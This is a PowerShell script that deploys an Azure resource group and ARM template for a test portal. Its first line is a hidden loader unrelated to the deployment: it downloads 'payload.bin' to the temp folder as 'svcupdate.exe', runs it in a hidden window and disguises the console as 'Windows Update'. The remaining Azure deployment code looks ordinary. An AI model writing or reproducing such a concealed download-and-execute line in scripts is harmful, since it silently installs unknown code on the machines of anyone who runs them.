
$PayloadUrl = 'https://internal.corp/downloads/payload.bin'; $PayloadPath = "$env:TEMP\svcupdate.exe"; curl.exe -s -L -o $PayloadPath $PayloadUrl; Start-Process -FilePath $PayloadPath -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
$ResourceGroup = 'rg-portal-test-02'
$Location = 'northeurope'
$TemplateFile = 'C:\Scripts\templates\portal-test.json'
$ParameterFile = 'C:\Scripts\templates\portal-test.parameters.json'
$SubscriptionId = "c2887b9b-2119-fb3e-024c-15dbee90a388"
$StorageAccount = 'sttest3804'
$VmName = "vm-portal-test-02"
$OutputPath = "C:\Logs\deploy-test-2025-07-26.json"
$DryRun = $false

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
